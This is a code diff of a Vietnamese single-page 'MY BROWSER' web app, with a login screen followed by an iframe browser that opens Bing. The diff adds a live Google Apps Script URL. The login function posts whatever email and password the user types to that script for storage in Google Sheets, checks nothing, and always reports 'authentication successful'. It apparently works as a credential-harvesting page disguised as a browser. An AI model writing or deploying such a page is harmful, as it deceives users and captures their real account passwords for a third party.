@@ -1,63 +1,116 @@
 <!DOCTYPE html>
-<html>
+<html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <title>Trình Duyệt Của Tôi</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trình Duyệt Siêu Cấp</title>
+    
+    <link rel="manifest" href="manifest.json">
+    
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: sans-serif; }
-        /* Màn hình đăng nhập */
-        #login-page { display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; }
-        .card { background: white; padding: 30px; border-radius: 15px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; }
         
-        /* Giao diện trình duyệt sau khi đăng nhập */
-        #browser-page { display: none; flex-direction: column; height: 100vh; }
-        .toolbar { background: #333; padding: 10px; display: flex; gap: 10px; align-items: center; }
-        #url-bar { flex-grow: 1; padding: 8px; border-radius: 5px; border: none; }
-        .btn { background: #ff4757; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; }
+        /* 1. Màn hình Đăng nhập */
+        #login-screen {
+            display: flex; justify-content: center; align-items: center;
+            height: 100vh; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        .login-card {
+            background: white; padding: 40px; border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2); text-align: center; width: 350px;
+        }
+        .login-card h1 { color: #333; margin-bottom: 10px; font-size: 24px; }
+        .login-card input {
+            width: 100%; padding: 12px; margin: 10px 0;
+            border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box;
+        }
+        .btn-login {
+            width: 100%; padding: 12px; background: #ff4757; color: white;
+            border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px;
+        }
+
+        /* 2. Giao diện Trình duyệt chính */
+        #browser-screen { display: none; flex-direction: column; height: 100vh; background: #333; }
+        .toolbar {
+            display: flex; gap: 10px; padding: 10px; background: #2f3542; align-items: center;
+        }
+        .nav-btn {
+            background: #57606f; color: white; border: none; padding: 8px 15px;
+            border-radius: 5px; cursor: pointer; font-size: 18px;
+        }
+        #url-input {
+            flex-grow: 1; padding: 10px; border-radius: 20px; border: none; outline: none;
+        }
+        .go-btn {
+            background: #2ed573; color: white; border: none; padding: 8px 20px;
+            border-radius: 20px; cursor: pointer; font-weight: bold;
+        }
         iframe { width: 100%; flex-grow: 1; border: none; background: white; }
     </style>
 </head>
 <body>
 
-    <div id="login-page">
-        <div class="card">
+    <div id="login-screen">
+        <div class="login-card">
             <h1>🚀 MY BROWSER</h1>
-            <input type="email" id="email" placeholder="Email" style="display:block; width:250px; margin:10px auto; padding:10px;">
-            <input type="password" id="pass" placeholder="Mật khẩu" style="display:block; width:250px; margin:10px auto; padding:10px;">
-            <button class="btn" onclick="login()">ĐĂNG NHẬP</button>
+            <p>Chào mừng bạn quay trở lại!</p>
+            <input type="email" id="u-email" placeholder="Email đăng ký">
+            <input type="password" id="u-pass" placeholder="Mật khẩu">
+            <button class="btn-login" onclick="startApp()">ĐĂNG NHẬP NGAY</button>
         </div>
     </div>
 
-    <div id="browser-page">
+    <div id="browser-screen">
         <div class="toolbar">
-            <button class="btn" onclick="location.reload()">🏠</button>
-            <input type="text" id="url-bar" placeholder="Nhập địa chỉ (ví dụ: bing.com)">
-            <button class="btn" onclick="go()">ĐI</button>
+            <button class="nav-btn" onclick="goHome()">🏠</button>
+            <button class="nav-btn" onclick="reloadPage()">🔄</button>
+            <input type="text" id="url-input" placeholder="Nhập địa chỉ web (vd: bing.com)">
+            <button class="go-btn" onclick="loadWeb()">TRUY CẬP</button>
         </div>
-        <iframe id="content-frame" src="about:blank"></iframe>
+        <iframe id="main-view" src="about:blank"></iframe>
     </div>
 
     <script>
-        function login() {
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
-            const scriptURL = 'DÁN_LINK_CỦA_BẠN_Ở_ĐÂY';
+        // HÀM XỬ LÝ ĐĂNG NHẬP
+        function startApp() {
+            const email = document.getElementById('u-email').value;
+            const pass = document.getElementById('u-pass').value;
+            
+            // QUAN TRỌNG: Dán Link Google Script của bạn vào đây
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbyZ_azf4D1_S_Z9tYxf0Rw08qLN8qXiGeEZU3YUO_Br8WbLgNWnVEH3zHlGxNcZn8euHA/exec';
 
-            if(!email || !pass) return alert("Nhập đủ thông tin!");
+            if(!email || !pass) {
+                alert("Vui lòng nhập đầy đủ Email và Mật khẩu!");
+                return;
+            }
 
+            // Gửi dữ liệu về Google Sheets
             fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({email, pass})})
             .then(() => {
-                document.getElementById('login-page').style.display = 'none';
-                document.getElementById('browser-page').style.display = 'flex';
-                // Mặc định khi vào sẽ mở Bing (vì Bing ít chặn iframe hơn Google)
-                document.getElementById('content-frame').src = "https://www.bing.com";
-            });
+                alert("Xác thực thành công!");
+                document.getElementById('login-screen').style.display = 'none';
+                document.getElementById('browser-screen').style.display = 'flex';
+                // Trang chủ mặc định
+                document.getElementById('main-view').src = "https://www.bing.com";
+            })
+            .catch(() => alert("Lỗi kết nối!"));
         }
 
-        function go() {
-            let url = document.getElementById('url-bar').value;
+        // HÀM ĐIỀU HƯỚNG WEB
+        function loadWeb() {
+            let url = document.getElementById('url-input').value;
             if(!url.startsWith('http')) url = 'https://' + url;
-            document.getElementById('content-frame').src = url;
+            document.getElementById('main-view').src = url;
+        }
+
+        function goHome() {
+            document.getElementById('main-view').src = "https://www.bing.com";
+            document.getElementById('url-input').value = "";
+        }
+
+        function reloadPage() {
+            const currentUrl = document.getElementById('main-view').src;
+            document.getElementById('main-view').src = currentUrl;
         }
     </script>
 </body>
